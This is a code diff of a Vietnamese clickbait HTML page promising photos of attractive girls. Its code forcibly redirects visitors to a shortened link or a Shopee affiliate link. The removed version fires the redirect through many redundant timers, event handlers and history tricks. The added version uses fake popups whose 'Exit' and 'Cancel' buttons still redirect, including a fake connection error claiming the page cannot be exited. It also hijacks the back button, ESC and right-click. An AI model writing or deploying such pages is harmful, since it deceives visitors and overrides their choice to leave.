@@ -1,215 +1,378 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>🔥 Girl Xinh Hot Nhất 2025</title>
-  <meta name="description" content="Xem ngay girl xinh Việt Nam hot nhất năm 2025!" />
-  <style>
-    * {
-      box-sizing: border-box;
-    }
-    body {
-      margin: 0;
-      font-family: 'Segoe UI', Arial, sans-serif;
-      background-color: #fff5f5;
-      min-height: 150vh;
-      padding: 16px;
-      position: relative;
-      overflow-x: hidden;
-    }
-    .card {
-      position: relative;
-      width: 100%;
-      max-width: 420px;
-      border-radius: 16px;
-      overflow: hidden;
-      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.25);
-      background-color: #ffffff;
-      text-align: center;
-      margin: 0 auto;
-      z-index: 1;
-    }
-    .card img {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-    .card h2 {
-      margin: 16px 12px 12px;
-      font-size: 22px;
-      color: #e53935;
-      line-height: 1.4;
-    }
-    .real-btn {
-      display: inline-block;
-      margin: 16px 0 24px;
-      padding: 14px 28px;
-      background-color: #ff5722;
-      color: white;
-      font-weight: 600;
-      font-size: 16px;
-      border-radius: 10px;
-      border: none;
-      cursor: pointer;
-      z-index: 2;
-      position: relative;
-    }
-    .full-cover {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: 5;
-      background: transparent;
-    }
-    
-    /* Invisible overlay để bắt click */
-    .invisible-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      z-index: 999;
-      background: transparent;
-      cursor: pointer;
-    }
-  </style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>🔥 Girl Xinh Hot Nhất 2025</title>
+    <meta name="description" content="Xem ngay girl xinh Việt Nam hot nhất năm 2025!"/>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+        
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #fff5f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            position: relative;
+        }
+        
+        .card {
+            position: relative;
+            width: 100%;
+            max-width: 420px;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.25);
+            background-color: #ffffff;
+            text-align: center;
+            z-index: 1;
+        }
+        
+        .card img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        .card h2 {
+            margin: 16px 12px 12px;
+            font-size: 22px;
+            color: #e53935;
+            line-height: 1.4;
+        }
+        
+        .real-btn {
+            display: inline-block;
+            margin: 16px 0 24px;
+            padding: 14px 28px;
+            background-color: #ff5722;
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
+            border-radius: 10px;
+            border: none;
+            cursor: pointer;
+            z-index: 2;
+            position: relative;
+        }
+        
+        .full-cover {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 5;
+            background: transparent;
+        }
+        
+        /* Popup Styles */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .popup {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            max-width: 380px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            animation: popupSlide 0.3s ease-out;
+        }
+        
+        @keyframes popupSlide {
+            from {
+                transform: translateY(-50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        
+        .popup-icon {
+            font-size: 48px;
+            margin-bottom: 16px;
+        }
+        
+        .popup-title {
+            font-size: 20px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 12px;
+        }
+        
+        .popup-message {
+            color: #666;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+        
+        .popup-buttons {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+        
+        .popup-btn {
+            flex: 1;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .popup-btn-primary {
+            background-color: #ff5722;
+            color: white;
+        }
+        
+        .popup-btn-primary:hover {
+            background-color: #e64a19;
+            transform: translateY(-1px);
+        }
+        
+        .popup-btn-secondary {
+            background-color: #f5f5f5;
+            color: #333;
+            border: 1px solid #ddd;
+        }
+        
+        .popup-btn-secondary:hover {
+            background-color: #eeeeee;
+            transform: translateY(-1px);
+        }
+        
+        /* Warning popup */
+        .warning-popup .popup-icon {
+            color: #ff9800;
+        }
+        
+        /* Confirm popup */
+        .confirm-popup .popup-icon {
+            color: #4caf50;
+        }
+        
+        /* Error popup */
+        .error-popup .popup-icon {
+            color: #f44336;
+        }
+    </style>
 </head>
 <body>
-  <div class="invisible-overlay" onclick="redirectNow()"></div>
-  <div class="full-cover" onclick="redirectNow()"></div>
-  
-  <div class="card" id="mobileCard" onclick="redirectNow()">
-    <img src="https://raw.githubusercontent.com/ncdathwb/Girl-Xinh-Viet-Nam/main/images/thumbnail.jpg" alt="Girl Xinh 2025" onclick="redirectNow()" />
-    <h2 onclick="redirectNow()">🔥 Girl Xinh HOT Nhất 2025!</h2>
-    <button class="real-btn" onclick="redirectNow()">Xem chi tiết</button>
-  </div>
-  
-  <script>
-    const isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(
-      navigator.userAgent.toLowerCase()
-    );
+    <!-- Popup cảnh báo -->
+    <div class="popup-overlay warning-popup" id="warningPopup">
+        <div class="popup">
+            <div class="popup-icon">⚠️</div>
+            <div class="popup-title">Cảnh báo!</div>
+            <div class="popup-message">
+                Nội dung này chỉ dành cho người trên 18 tuổi.<br>
+                Bạn có muốn tiếp tục?
+            </div>
+            <div class="popup-buttons">
+                <button class="popup-btn popup-btn-secondary" id="exitBtn1">Thoát</button>
+                <button class="popup-btn popup-btn-primary" id="continueBtn1">Tiếp tục</button>
+            </div>
+        </div>
+    </div>
     
-    const mobileRedirect = "https://bit.ly/4mFmhBP";
-    const desktopRedirect = "https://s.shopee.vn/BHgbsTkUj";
+    <!-- Popup xác nhận -->
+    <div class="popup-overlay confirm-popup" id="confirmPopup">
+        <div class="popup">
+            <div class="popup-icon">✅</div>
+            <div class="popup-title">Xác nhận</div>
+            <div class="popup-message">
+                Bạn sẽ được chuyển đến trang xem nội dung.<br>
+                Bạn có chắc chắn muốn tiếp tục?
+            </div>
+            <div class="popup-buttons">
+                <button class="popup-btn popup-btn-secondary" id="cancelBtn">Hủy bỏ</button>
+                <button class="popup-btn popup-btn-primary" id="confirmBtn">Xác nhận</button>
+            </div>
+        </div>
+    </div>
     
-    let hasRedirected = false;
+    <!-- Popup lỗi giả -->
+    <div class="popup-overlay error-popup" id="errorPopup">
+        <div class="popup">
+            <div class="popup-icon">❌</div>
+            <div class="popup-title">Lỗi kết nối</div>
+            <div class="popup-message">
+                Không thể thoát trang này do lỗi kết nối.<br>
+                Vui lòng thử lại hoặc tiếp tục xem nội dung.
+            </div>
+            <div class="popup-buttons">
+                <button class="popup-btn popup-btn-secondary" id="retryBtn">Thử lại</button>
+                <button class="popup-btn popup-btn-primary" id="continueBtn2">Tiếp tục xem</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toàn màn hình là một lớp click trong suốt -->
+    <div class="full-cover" id="fullClick"></div>
     
-    function redirectNow() {
-      if (!hasRedirected) {
-        hasRedirected = true;
-        window.location.href = mobileRedirect;
-      }
-    }
-    
-    if (!isMobile) {
-      window.location.href = desktopRedirect;
-    } else {
-      document.getElementById("mobileCard").style.display = "block";
-      
-      // Method 1: Redirect ngay sau 0.5 giây
-      setTimeout(redirectNow, 500);
-      
-      // Method 2: Redirect khi page load xong
-      window.onload = redirectNow;
-      document.onload = redirectNow;
-      
-      // Method 3: Redirect khi DOMContentLoaded
-      document.addEventListener('DOMContentLoaded', redirectNow);
-      
-      // Method 4: Redirect với interval ngắn
-      let quickInterval = setInterval(redirectNow, 100);
-      
-      // Method 5: Multiple timer backups
-      setTimeout(redirectNow, 200);
-      setTimeout(redirectNow, 800);
-      setTimeout(redirectNow, 1200);
-      setTimeout(redirectNow, 1500);
-      
-      // Method 6: Inline onclick trên tất cả elements
-      document.onclick = redirectNow;
-      document.ontouchstart = redirectNow;
-      document.ontouchmove = redirectNow;
-      document.ontouchend = redirectNow;
-      document.onscroll = redirectNow;
-      document.onwheel = redirectNow;
-      document.onkeydown = redirectNow;
-      document.onmousemove = redirectNow;
-      document.onmousedown = redirectNow;
-      
-      // Method 7: Window events
-      window.onclick = redirectNow;
-      window.ontouchstart = redirectNow;
-      window.onscroll = redirectNow;
-      window.onfocus = redirectNow;
-      window.onblur = redirectNow;
-      
-      // Method 8: Body events
-      document.body.onclick = redirectNow;
-      document.body.ontouchstart = redirectNow;
-      document.body.onscroll = redirectNow;
-      
-      // Method 9: Meta refresh backup
-      setTimeout(function() {
-        if (!hasRedirected) {
-          document.head.innerHTML += '<meta http-equiv="refresh" content="0;url=' + mobileRedirect + '">';
+    <div class="card" id="mobileCard">
+        <img src="https://raw.githubusercontent.com/ncdathwb/Girl-Xinh-Viet-Nam/main/images/thumbnail.jpg" 
+             alt="Girl Xinh 2025">
+        <h2>🔥 Girl Xinh HOT Nhất 2025!</h2>
+        <button class="real-btn" id="realBtn">Xem chi tiết</button>
+    </div>
+
+    <script>
+        const isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(navigator.userAgent.toLowerCase());
+        const mobileRedirect = "https://bit.ly/4mFmhBP";
+        const desktopRedirect = "https://s.shopee.vn/BHgbsTkUj";
+        
+        let redirectUrl = isMobile ? mobileRedirect : desktopRedirect;
+        let popupStep = 0;
+        let hasRedirected = false;
+        
+        // Function để thực hiện chuyển hướng
+        function performRedirect() {
+            if (!hasRedirected) {
+                hasRedirected = true;
+                window.location.href = redirectUrl;
+            }
         }
-      }, 1000);
-      
-      // Method 10: Location assign backup
-      setTimeout(function() {
-        if (!hasRedirected) {
-          window.location.assign(mobileRedirect);
+        
+        // Function hiển thị popup
+        function showPopup(popupId) {
+            document.getElementById(popupId).style.display = 'flex';
         }
-      }, 1500);
-      
-      // Method 11: Location replace backup  
-      setTimeout(function() {
-        if (!hasRedirected) {
-          window.location.replace(mobileRedirect);
+        
+        function hidePopup(popupId) {
+            document.getElementById(popupId).style.display = 'none';
         }
-      }, 2000);
-      
-      // Method 12: History pushState trigger
-      if (history.pushState) {
-        history.pushState(null, null, window.location.href);
-        window.onpopstate = redirectNow;
-      }
-      
-      // Method 13: Hash change trigger
-      window.onhashchange = redirectNow;
-      setTimeout(function() {
-        window.location.hash = '#redirect';
-      }, 300);
-      
-      // Method 14: Visibility change
-      document.onvisibilitychange = function() {
-        if (!document.hidden) redirectNow();
-      };
-      
-      // Method 15: RequestAnimationFrame loop
-      function animationLoop() {
-        redirectNow();
-        if (!hasRedirected) {
-          requestAnimationFrame(animationLoop);
+        
+        // Xử lý các sự kiện click ban đầu
+        function handleInitialClick() {
+            if (popupStep === 0) {
+                popupStep = 1;
+                showPopup('warningPopup');
+            }
         }
-      }
-      requestAnimationFrame(animationLoop);
-      
-      // Method 16: Force redirect với window.open backup
-      setTimeout(function() {
-        if (!hasRedirected) {
-          try {
-            window.open(mobileRedirect, '_self');
-          } catch(e) {
-            window.location = mobileRedirect;
-          }
+        
+        // Event listeners cho popup đầu tiên (Warning)
+        document.getElementById('exitBtn1').addEventListener('click', function() {
+            hidePopup('warningPopup');
+            popupStep = 2;
+            // Giả vờ "thoát" nhưng hiện popup lỗi
+            setTimeout(() => {
+                showPopup('errorPopup');
+            }, 500);
+        });
+        
+        document.getElementById('continueBtn1').addEventListener('click', function() {
+            hidePopup('warningPopup');
+            popupStep = 2;
+            // Hiện popup xác nhận
+            setTimeout(() => {
+                showPopup('confirmPopup');
+            }, 300);
+        });
+        
+        // Event listeners cho popup xác nhận
+        document.getElementById('cancelBtn').addEventListener('click', function() {
+            hidePopup('confirmPopup');
+            // Giả vờ "hủy" nhưng vẫn chuyển hướng
+            setTimeout(() => {
+                performRedirect();
+            }, 500);
+        });
+        
+        document.getElementById('confirmBtn').addEventListener('click', function() {
+            hidePopup('confirmPopup');
+            performRedirect();
+        });
+        
+        // Event listeners cho popup lỗi
+        document.getElementById('retryBtn').addEventListener('click', function() {
+            hidePopup('errorPopup');
+            // "Thử lại" nhưng vẫn chuyển hướng
+            setTimeout(() => {
+                performRedirect();
+            }, 500);
+        });
+        
+        document.getElementById('continueBtn2').addEventListener('click', function() {
+            hidePopup('errorPopup');
+            performRedirect();
+        });
+        
+        // Event listeners cho các elements chính
+        document.getElementById("fullClick").addEventListener("click", handleInitialClick);
+        document.getElementById("realBtn").addEventListener("click", handleInitialClick);
+        document.getElementById("mobileCard").addEventListener("click", handleInitialClick);
+        
+        // Tự động hiện popup sau 3 giây nếu chưa có tương tác
+        setTimeout(() => {
+            if (popupStep === 0) {
+                handleInitialClick();
+            }
+        }, 3000);
+        
+        // Backup redirect nếu user không làm gì trong 30 giây
+        setTimeout(() => {
+            if (!hasRedirected) {
+                performRedirect();
+            }
+        }, 30000);
+        
+        // Ngăn chặn đóng popup bằng ESC
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                e.preventDefault();
+                if (popupStep > 0) {
+                    performRedirect();
+                }
+            }
+        });
+        
+        // Ngăn chặn right-click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            if (popupStep === 0) {
+                handleInitialClick();
+            } else {
+                performRedirect();
+            }
+        });
+        
+        // Chuyển hướng ngay cho desktop
+        if (!isMobile) {
+            setTimeout(() => {
+                if (popupStep === 0) {
+                    handleInitialClick();
+                }
+            }, 1000);
         }
-      }, 2500);
-    }
-  </script>
+        
+        // Ngăn chặn back button
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', function () {
+            history.pushState(null, null, location.href);
+            performRedirect();
+        });
+    </script>
 </body>
 </html>
